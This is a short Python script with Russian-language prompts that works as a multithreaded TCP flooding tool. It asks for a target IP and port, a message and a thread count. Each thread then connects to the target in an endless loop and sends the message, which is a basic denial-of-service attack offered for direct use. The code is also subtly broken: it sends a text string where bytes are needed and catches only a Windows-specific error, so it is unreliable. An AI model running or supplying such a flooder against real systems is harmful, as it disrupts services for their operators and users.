import os
import threading
import socket
import time
from rich import print
from rich.panel import Panel


def cls():
	time.sleep(1)
	os.system("clear")


def attack(target_ip: str, target_port: int, buffersize: int, msg: str, threads: int):
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target_ip, target_port))
			s.send(msg)
			data = s.recv(buffersize)
			s.close()
			print(Panel.fit(f"[blue]Отправил[/blue] [red]{data}[/red]"))
		except WindowsError as e:
			if e.winerror == 10061:
				print(Panel.fit(f"[blue]Не смог отправить пакет[/blue] [red](winerror 10061)[/red]"))
			else:
				print(Panel.fit("[blue]Не смог отправить пакет[/blue] [red](неизвестная ошибка)[/red]"))


def setup():
	print(Panel.fit("[blue]Введите цель в формате IP:PORT[/blue]"))
	ipport = input()
	if ":" in list(ipport):
		ippcorrect = ipport.split(sep=":")
	else:
		print(Panel.fit("[red]Некорректный ввод[/red]"))
		cls()
		os.abort()
	print(Panel.fit(f"[green]Заданная цель: {ippcorrect[0]}:{ippcorrect[1]}[/green]"))
	cls()
	print(Panel.fit("[blue]Теперь введите размер буфера[/blue]"))
	buffersize = int(input())
	cls()
	print(Panel.fit(f"[green]Размер буфера: {buffersize} [/green]"))
	cls()
	print(Panel.fit("[blue]Введите сообщение для отправки[/blue]"))
	msg = input()
	cls()
	print(Panel.fit(f"[green]Сообщение {msg}[/green]"))
	cls()
	print(Panel.fit("[blue]Введите количество потоков[/blue]"))
	threads = int(input())
	cls()
	for i in range(threads):
		at = threading.Thread(target=attack, args=(ippcorrect[0], int(ippcorrect[1]), buffersize, msg, threads))
		at.start()
		print(Panel.fit(f"[green]Создан поток {i+1}[/green]"))


setup()
